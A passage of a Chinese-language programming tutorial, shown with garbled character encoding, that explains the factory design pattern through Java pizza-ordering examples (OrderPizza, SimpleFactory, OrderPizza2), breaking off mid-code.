ä¸­æœ€å¸¸ç”¨çš„è®¾è®¡æ¨¡å¼ä¹‹ä¸€ã€‚è¿™ç§ç±»å‹çš„è®¾è®¡æ¨¡å¼å±äºåˆ›å»ºå‹æ¨¡å¼ï¼Œå®ƒæä¾›äº†ä¸€ç§åˆ›å»ºå¯¹è±¡çš„æœ€ä½³æ–¹å¼ã€‚</p><p>åœ¨å·¥å‚æ¨¡å¼ä¸­ï¼Œæˆ‘ä»¬åœ¨åˆ›å»ºå¯¹è±¡æ—¶ä¸ä¼šå¯¹å®¢æˆ·ç«¯æš´éœ²åˆ›å»ºé€»è¾‘ï¼Œå¹¶ä¸”æ˜¯é€šè¿‡ä½¿ç”¨ä¸€ä¸ªå…±åŒçš„æ¥å£æ¥æŒ‡å‘æ–°åˆ›å»ºçš„å¯¹è±¡ã€‚</p><h2 id="ä»‹ç»-2"><a class="markdownIt-Anchor" href="#ä»‹ç»-2"></a> ä»‹ç»</h2><p><strong>æ„å›¾ï¼š</strong> å®šä¹‰ä¸€ä¸ªåˆ›å»ºå¯¹è±¡çš„æ¥å£ï¼Œè®©å…¶å­ç±»è‡ªå·±å†³å®šå®ä¾‹åŒ–å“ªä¸€ä¸ªå·¥å‚ç±»ï¼Œå·¥å‚æ¨¡å¼ä½¿å…¶åˆ›å»ºè¿‡ç¨‹å»¶è¿Ÿåˆ°å­ç±»è¿›è¡Œã€‚</p><p><strong>ä¸»è¦è§£å†³ï¼š</strong> ä¸»è¦è§£å†³æ¥å£é€‰æ‹©çš„é—®é¢˜ã€‚</p><p><strong>ä½•æ—¶ä½¿ç”¨ï¼š</strong> æˆ‘ä»¬æ˜ç¡®åœ°è®¡åˆ’ä¸åŒæ¡ä»¶ä¸‹åˆ›å»ºä¸åŒå®ä¾‹æ—¶ã€‚</p><p><strong>å¦‚ä½•è§£å†³ï¼š</strong> è®©å…¶å­ç±»å®ç°å·¥å‚æ¥å£ï¼Œè¿”å›çš„ä¹Ÿæ˜¯ä¸€ä¸ªæŠ½è±¡çš„äº§å“ã€‚</p><p><strong>å…³é”®ä»£ç ï¼š</strong> åˆ›å»ºè¿‡ç¨‹åœ¨å…¶å­ç±»æ‰§è¡Œã€‚</p><p><strong>åº”ç”¨å®ä¾‹ï¼š</strong> 1ã€æ‚¨éœ€è¦ä¸€è¾†æ±½è½¦ï¼Œå¯ä»¥ç›´æ¥ä»å·¥å‚é‡Œé¢æè´§ï¼Œè€Œä¸ç”¨å»ç®¡è¿™è¾†æ±½è½¦æ˜¯æ€ä¹ˆåšå‡ºæ¥çš„ï¼Œä»¥åŠè¿™ä¸ªæ±½è½¦é‡Œé¢çš„å…·ä½“å®ç°ã€‚ 2ã€Hibernateæ¢æ•°æ®åº“åªéœ€æ¢æ–¹è¨€å’Œé©±åŠ¨å°±å¯ä»¥ã€‚</p><p><strong>ä¼˜ç‚¹ï¼š</strong> 1ã€ä¸€ä¸ªè°ƒç”¨è€…æƒ³åˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œåªè¦çŸ¥é“å…¶åç§°å°±å¯ä»¥äº†ã€‚ 2ã€æ‰©å±•æ€§é«˜ï¼Œå¦‚æœæƒ³å¢åŠ ä¸€ä¸ªäº§å“ï¼Œåªè¦æ‰©å±•ä¸€ä¸ªå·¥å‚ç±»å°±å¯ä»¥ã€‚<br />3ã€å±è”½äº§å“çš„å…·ä½“å®ç°ï¼Œè°ƒç”¨è€…åªå…³å¿ƒäº§å“çš„æ¥å£ã€‚</p><p><strong>ç¼ºç‚¹ï¼š</strong><br />æ¯æ¬¡å¢åŠ ä¸€ä¸ªäº§å“æ—¶ï¼Œéƒ½éœ€è¦å¢åŠ ä¸€ä¸ªå…·ä½“ç±»å’Œå¯¹è±¡å®ç°å·¥å‚ï¼Œä½¿å¾—ç³»ç»Ÿä¸­ç±»çš„ä¸ªæ•°æˆå€å¢åŠ ï¼Œåœ¨ä¸€å®šç¨‹åº¦ä¸Šå¢åŠ äº†ç³»ç»Ÿçš„å¤æ‚åº¦ï¼ŒåŒæ—¶ä¹Ÿå¢åŠ äº†ç³»ç»Ÿå…·ä½“ç±»çš„ä¾èµ–ã€‚è¿™å¹¶ä¸æ˜¯ä»€ä¹ˆå¥½äº‹ã€‚</p><p><strong>ä½¿ç”¨åœºæ™¯ï¼š</strong></p><p>1ã€æ—¥å¿—è®°å½•å™¨ï¼šè®°å½•å¯èƒ½è®°å½•åˆ°æœ¬åœ°ç¡¬ç›˜ã€ç³»ç»Ÿäº‹ä»¶ã€è¿œç¨‹æœåŠ¡å™¨ç­‰ï¼Œç”¨æˆ·å¯ä»¥é€‰æ‹©è®°å½•æ—¥å¿—åˆ°ä»€ä¹ˆåœ°æ–¹ã€‚<br />2ã€æ•°æ®åº“è®¿é—®ï¼Œå½“ç”¨æˆ·ä¸çŸ¥é“æœ€åç³»ç»Ÿé‡‡ç”¨å“ªä¸€ç±»æ•°æ®åº“ï¼Œä»¥åŠæ•°æ®åº“å¯èƒ½æœ‰å˜åŒ–æ—¶ã€‚<br />3ã€è®¾è®¡ä¸€ä¸ªè¿æ¥æœåŠ¡å™¨çš„æ¡†æ¶ï¼Œéœ€è¦ä¸‰ä¸ªåè®®ï¼Œâ€œPOP3â€ã€â€œIMAPâ€ã€â€œHTTPâ€ï¼Œå¯ä»¥æŠŠè¿™ä¸‰ä¸ªä½œä¸ºäº§å“ç±»ï¼Œå…±åŒå®ç°ä¸€ä¸ªæ¥å£ã€‚</p><p><strong>æ³¨æ„äº‹é¡¹ï¼š</strong><br />ä½œä¸ºä¸€ç§åˆ›å»ºç±»æ¨¡å¼ï¼Œåœ¨ä»»ä½•éœ€è¦ç”Ÿæˆå¤æ‚å¯¹è±¡çš„åœ°æ–¹ï¼Œéƒ½å¯ä»¥ä½¿ç”¨å·¥å‚æ–¹æ³•æ¨¡å¼ã€‚æœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„çš„åœ°æ–¹å°±æ˜¯å¤æ‚å¯¹è±¡é€‚åˆä½¿ç”¨å·¥å‚æ¨¡å¼ï¼Œè€Œç®€å•å¯¹è±¡ï¼Œç‰¹åˆ«æ˜¯åªéœ€è¦é€šè¿‡new å°±å¯ä»¥å®Œæˆåˆ›å»ºçš„å¯¹è±¡ï¼Œæ— éœ€ä½¿ç”¨å·¥å‚æ¨¡å¼ã€‚å¦‚æœä½¿ç”¨å·¥å‚æ¨¡å¼ï¼Œå°±éœ€è¦å¼•å…¥ä¸€ä¸ªå·¥å‚ç±»ï¼Œä¼šå¢åŠ ç³»ç»Ÿçš„å¤æ‚åº¦ã€‚</p><h2 id="å®ç°å››ç§æ–¹å¼"><a class="markdownIt-Anchor" href="#å®ç°å››ç§æ–¹å¼"></a> å®ç°å››ç§æ–¹å¼</h2><p>â€‹    çœ‹ä¸€ä¸ªæŠ«è¨çš„é¡¹ç›®ï¼šè¦ä¾¿äºæŠ«è¨ç§ç±»çš„æ‰©å±•ï¼Œè¦ä¾¿äºç»´æŠ¤</p><ol><li>æŠ«è¨çš„ç§ç±»å¾ˆå¤š(æ¯”å¦‚ GreekPizzã€CheesePizz ç­‰)</li><li>æŠ«è¨çš„åˆ¶ä½œæœ‰ prepareï¼Œbake, cut, box</li><li>å®ŒæˆæŠ«è¨åº—è®¢è´­åŠŸèƒ½ã€‚</li></ol><h3 id="ä½¿ç”¨ä¼ ç»Ÿçš„æ–¹å¼æ¥å®Œæˆ"><a class="markdownIt-Anchor" href="#ä½¿ç”¨ä¼ ç»Ÿçš„æ–¹å¼æ¥å®Œæˆ"></a> ä½¿ç”¨ä¼ ç»Ÿçš„æ–¹å¼æ¥å®Œæˆ</h3><ol><li>æ€è·¯åˆ†æ(ç±»å›¾)</li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221224163121334.png" alt="image-20221224163121334" /></p><p>ç¼–å†™ OrderPizza.java å»è®¢è´­éœ€è¦çš„å„ç§ Pizza</p><p>ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderPizza</span> &#123;<br>    <span class="hljs-comment">// æ„é€ å™¨</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">OrderPizza</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-type">Pizza</span> <span class="hljs-variable">pizza</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>String orderType; <span class="hljs-comment">// è®¢è´­æŠ«è¨çš„ç±»å‹</span><br><span class="hljs-keyword">do</span> &#123;<br>orderType = getType();<br><span class="hljs-keyword">if</span> (orderType.equals(<span class="hljs-string">&quot;greek&quot;</span>)) &#123;<br>pizza = <span class="hljs-keyword">new</span> <span class="hljs-title class_">GreekPizza</span>();<br>pizza.setName(<span class="hljs-string">&quot; å¸Œè…ŠæŠ«è¨ &quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (orderType.equals(<span class="hljs-string">&quot;cheese&quot;</span>)) &#123;<br>pizza = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CheesePizza</span>();<br>pizza.setName(<span class="hljs-string">&quot; å¥¶é…ªæŠ«è¨ &quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (orderType.equals(<span class="hljs-string">&quot;pepper&quot;</span>)) &#123;<br>pizza = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PepperPizza</span>();<br>pizza.setName(<span class="hljs-string">&quot;èƒ¡æ¤’æŠ«è¨&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-comment">//è¾“å‡ºpizza åˆ¶ä½œè¿‡ç¨‹</span><br>pizza.prepare();<br>pizza.bake();<br>pizza.cut();<br>pizza.box();<br><br>&#125; <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>);<br>&#125;<br>    <span class="hljs-comment">// å†™ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥è·å–å®¢æˆ·å¸Œæœ›è®¢è´­çš„æŠ«è¨ç§ç±»</span><br><span class="hljs-keyword">private</span> String <span class="hljs-title function_">getType</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-type">BufferedReader</span> <span class="hljs-variable">strin</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(System.in));<br>System.out.println(<span class="hljs-string">&quot;input pizza ç§ç±»:&quot;</span>);<br><span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> strin.readLine();<br><span class="hljs-keyword">return</span> str;<br>&#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>e.printStackTrace();<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>&#125;<br>&#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><ol><li><p>ä¼˜ç‚¹æ˜¯æ¯”è¾ƒå¥½ç†è§£ï¼Œç®€å•æ˜“æ“ä½œã€‚</p></li><li><p>ç¼ºç‚¹æ˜¯è¿åäº†è®¾è®¡æ¨¡å¼çš„ <strong>ocp åŸåˆ™</strong>ï¼Œå³å¯¹æ‰©å±•å¼€æ”¾ï¼Œå¯¹ä¿®æ”¹å…³é—­ã€‚å³å½“æˆ‘ä»¬ç»™ç±»å¢åŠ æ–°åŠŸèƒ½çš„æ—¶å€™ï¼Œå°½é‡ä¸ä¿®æ”¹ä»£ç ï¼Œæˆ–è€…å°½å¯èƒ½å°‘ä¿®æ”¹ä»£ç .</p></li><li><p>æ¯”å¦‚æˆ‘ä»¬è¿™æ—¶<strong>è¦æ–°å¢åŠ ä¸€ä¸ª Pizza çš„ç§ç±»(Pepper æŠ«è¨)</strong>ï¼Œæˆ‘ä»¬éœ€è¦åšå¦‚ä¸‹ä¿®æ”¹.</p></li></ol><p>å¦‚æœæˆ‘ä»¬å¢åŠ ä¸€ä¸ª Pizza ç±»ï¼Œåªè¦æ˜¯è®¢è´­ Pizza çš„ä»£ç éƒ½éœ€è¦ä¿®æ”¹.</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221224163539743.png" alt="image-20221224163539743" /></p><ol start="4"><li>æ”¹è¿›çš„æ€è·¯åˆ†æ</li></ol><p>åˆ†æï¼šä¿®æ”¹ä»£ç å¯ä»¥æ¥å—ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬åœ¨å…¶å®ƒçš„åœ°æ–¹ä¹Ÿæœ‰åˆ›å»º Pizza çš„ä»£ç ï¼Œå°±æ„å‘³ç€ï¼Œä¹Ÿéœ€è¦ä¿®æ”¹ï¼Œè€Œåˆ›å»º Pizzaçš„ä»£ç ï¼Œå¾€å¾€æœ‰å¤šå¤„ã€‚</p><p>æ€è·¯ï¼š<strong>æŠŠåˆ›å»º Pizza å¯¹è±¡å°è£…åˆ°ä¸€ä¸ªç±»ä¸­ï¼Œè¿™æ ·æˆ‘ä»¬æœ‰æ–°çš„ Pizza ç§ç±»æ—¶ï¼Œåªéœ€è¦ä¿®æ”¹è¯¥ç±»å°±å¯</strong>ï¼Œå…¶å®ƒæœ‰åˆ›å»ºåˆ° Pizzaå¯¹è±¡çš„ä»£ç å°±ä¸éœ€è¦ä¿®æ”¹äº†.-&gt; <strong>ç®€å•å·¥å‚</strong>æ¨¡å¼</p><h3 id="ä½¿ç”¨ç®€å•å·¥å‚æ¨¡å¼"><a class="markdownIt-Anchor" href="#ä½¿ç”¨ç®€å•å·¥å‚æ¨¡å¼"></a> ä½¿ç”¨ç®€å•å·¥å‚æ¨¡å¼</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221224163606286.png" alt="image-20221224163606286" /></p><p><strong>ä»£ç </strong></p><p><code>SimpleFactory</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">package</span> io.xtwoy.factory.simplefactory.pizzastore.order;<br><br><span class="hljs-keyword">import</span> io.xtwoy.factory.simplefactory.pizzastore.pizza.CheesePizza;<br><span class="hljs-keyword">import</span> io.xtwoy.factory.simplefactory.pizzastore.pizza.GreekPizza;<br><span class="hljs-keyword">import</span> io.xtwoy.factory.simplefactory.pizzastore.pizza.PepperPizza;<br><span class="hljs-keyword">import</span> io.xtwoy.factory.simplefactory.pizzastore.pizza.Pizza;<br><br><span class="hljs-comment">//ç®€å•å·¥å‚ç±»</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SimpleFactory</span> &#123;<br><br>   <span class="hljs-comment">//æ›´åŠ orderType è¿”å›å¯¹åº”çš„Pizza å¯¹è±¡</span><br>   <span class="hljs-keyword">public</span> Pizza <span class="hljs-title function_">createPizza</span><span class="hljs-params">(String orderType)</span> &#123;<br><br>      <span class="hljs-type">Pizza</span> <span class="hljs-variable">pizza</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>      System.out.println(<span class="hljs-string">&quot;ä½¿ç”¨ç®€å•å·¥å‚æ¨¡å¼&quot;</span>);<br>      <span class="hljs-keyword">if</span> (orderType.equals(<span class="hljs-string">&quot;greek&quot;</span>)) &#123;<br>         pizza = <span class="hljs-keyword">new</span> <span class="hljs-title class_">GreekPizza</span>();<br>         pizza.setName(<span class="hljs-string">&quot; å¸Œè…ŠæŠ«è¨ &quot;</span>);<br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (orderType.equals(<span class="hljs-string">&quot;cheese&quot;</span>)) &#123;<br>         pizza = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CheesePizza</span>();<br>         pizza.setName(<span class="hljs-string">&quot; å¥¶é…ªæŠ«è¨ &quot;</span>);<br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (orderType.equals(<span class="hljs-string">&quot;pepper&quot;</span>)) &#123;<br>         pizza = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PepperPizza</span>();<br>         pizza.setName(<span class="hljs-string">&quot;èƒ¡æ¤’æŠ«è¨&quot;</span>);<br>      &#125;<br>      <br>      <span class="hljs-keyword">return</span> pizza;<br>   &#125;<br>   <br>   <span class="hljs-comment">//ç®€å•å·¥å‚æ¨¡å¼ ä¹Ÿå« é™æ€å·¥å‚æ¨¡å¼ </span><br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Pizza <span class="hljs-title function_">createPizza2</span><span class="hljs-params">(String orderType)</span> &#123;<br>      <span class="hljs-type">Pizza</span> <span class="hljs-variable">pizza</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>      System.out.println(<span class="hljs-string">&quot;ä½¿ç”¨ç®€å•å·¥å‚æ¨¡å¼2&quot;</span>);<br>      <span class="hljs-keyword">if</span> (orderType.equals(<span class="hljs-string">&quot;greek&quot;</span>)) &#123;<br>         pizza = <span class="hljs-keyword">new</span> <span class="hljs-title class_">GreekPizza</span>();<br>         pizza.setName(<span class="hljs-string">&quot; å¸Œè…ŠæŠ«è¨ &quot;</span>);<br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (orderType.equals(<span class="hljs-string">&quot;cheese&quot;</span>)) &#123;<br>         pizza = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CheesePizza</span>();<br>         pizza.setName(<span class="hljs-string">&quot; å¥¶é…ªæŠ«è¨ &quot;</span>);<br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (orderType.equals(<span class="hljs-string">&quot;pepper&quot;</span>)) &#123;<br>         pizza = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PepperPizza</span>();<br>         pizza.setName(<span class="hljs-string">&quot;èƒ¡æ¤’æŠ«è¨&quot;</span>);<br>      &#125;<br>      <span class="hljs-keyword">return</span> pizza;<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>OrderPizza</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.factory.simplefactory.pizzastore.order;<br><br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><br><br><span class="hljs-keyword">import</span> io.xtwoy.factory.simplefactory.pizzastore.pizza.CheesePizza;<br><span class="hljs-keyword">import</span> io.xtwoy.factory.simplefactory.pizzastore.pizza.GreekPizza;<br><span class="hljs-keyword">import</span> io.xtwoy.factory.simplefactory.pizzastore.pizza.PepperPizza;<br><span class="hljs-keyword">import</span> io.xtwoy.factory.simplefactory.pizzastore.pizza.Pizza;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderPizza</span> &#123;<br><br><span class="hljs-comment">////    æ„é€ å™¨</span><br><span class="hljs-comment">// public OrderPizza() &#123;</span><br><span class="hljs-comment">//    Pizza pizza = null;</span><br><span class="hljs-comment">//    String orderType; // è®¢è´­æŠ«è¨çš„ç±»å‹</span><br><span class="hljs-comment">//    do &#123;</span><br><span class="hljs-comment">//       orderType = getType();</span><br><span class="hljs-comment">//       if (orderType.equals(&quot;greek&quot;)) &#123;</span><br><span class="hljs-comment">//          pizza = new GreekPizza();</span><br><span class="hljs-comment">//          pizza.setName(&quot; å¸Œè…ŠæŠ«è¨ &quot;);</span><br><span class="hljs-comment">//       &#125; else if (orderType.equals(&quot;cheese&quot;)) &#123;</span><br><span class="hljs-comment">//          pizza = new CheesePizza();</span><br><span class="hljs-comment">//          pizza.setName(&quot; å¥¶é…ªæŠ«è¨ &quot;);</span><br><span class="hljs-comment">//       &#125; else if (orderType.equals(&quot;pepper&quot;)) &#123;</span><br><span class="hljs-comment">//          pizza = new PepperPizza();</span><br><span class="hljs-comment">//          pizza.setName(&quot;èƒ¡æ¤’æŠ«è¨&quot;);</span><br><span class="hljs-comment">//       &#125; else &#123;</span><br><span class="hljs-comment">//          break;</span><br><span class="hljs-comment">//       &#125;</span><br><span class="hljs-comment">//       //è¾“å‡ºpizza åˆ¶ä½œè¿‡ç¨‹</span><br><span class="hljs-comment">//       pizza.prepare();</span><br><span class="hljs-comment">//       pizza.bake();</span><br><span class="hljs-comment">//       pizza.cut();</span><br><span class="hljs-comment">//       pizza.box();</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//    &#125; while (true);</span><br><span class="hljs-comment">// &#125;</span><br><br>   <span class="hljs-comment">//å®šä¹‰ä¸€ä¸ªç®€å•å·¥å‚å¯¹è±¡</span><br>   SimpleFactory simpleFactory;<br>   <span class="hljs-type">Pizza</span> <span class="hljs-variable">pizza</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>   <br>   <span class="hljs-comment">//æ„é€ å™¨</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">OrderPizza</span><span class="hljs-params">(SimpleFactory simpleFactory)</span> &#123;<br>      setFactory(simpleFactory);<br>   &#125;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFactory</span><span class="hljs-params">(SimpleFactory simpleFactory)</span> &#123;<br>      <span class="hljs-type">String</span> <span class="hljs-variable">orderType</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>; <span class="hljs-comment">//ç”¨æˆ·è¾“å…¥çš„</span><br>      <br>      <span class="hljs-built_in">this</span>.simpleFactory = simpleFactory; <span class="hljs-comment">//è®¾ç½®ç®€å•å·¥å‚å¯¹è±¡</span><br>      <br>      <span class="hljs-keyword">do</span> &#123;<br>         orderType = getType(); <br>         pizza = <span class="hljs-built_in">this</span>.simpleFactory.createPizza(orderType);<br>         <br>         <span class="hljs-comment">//è¾“å‡ºpizza</span><br>         <span class="hljs-keyword">if</span>(pizza != <span class="hljs-literal">null</span>) &#123; <span class="hljs-comment">//è®¢è´­æˆåŠŸ</span><br>            pizza.prepare();<br>            pizza.bake();<br>            pizza.cut();<br>            pizza.box();<br>         &#125; <span class="hljs-keyword">else</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot; è®¢è´­æŠ«è¨å¤±è´¥ &quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>         &#125;<br>      &#125;<span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>);<br>   &#125;<br>   <br>   <span class="hljs-comment">// å†™ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥è·å–å®¢æˆ·å¸Œæœ›è®¢è´­çš„æŠ«è¨ç§ç±»</span><br>   <span class="hljs-keyword">private</span> String <span class="hljs-title function_">getType</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">try</span> &#123;<br>         <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">strin</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(System.in));<br>         System.out.println(<span class="hljs-string">&quot;input pizza ç§ç±»:&quot;</span>);<br>         <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> strin.readLine();<br>         <span class="hljs-keyword">return</span> str;<br>      &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>         e.printStackTrace();<br>         <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>      &#125;<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>OrderPizza2</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.factory.simplefactory.pizzastore.order;<br><br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><br><span class="hljs-keyword">import</span> io.xtwoy.factory.simplefactory.pizzastore.pizza.Pizza;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderPizza2</span> &#123;<br><br><span class="hljs-type">Pizza</span> <span class="hljs-variable">pizza</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">orderType</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-comment">// æ„é€ å™¨</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">OrderPizza2</span><span class="hljs-params">()</span> &#123;<br><br><span 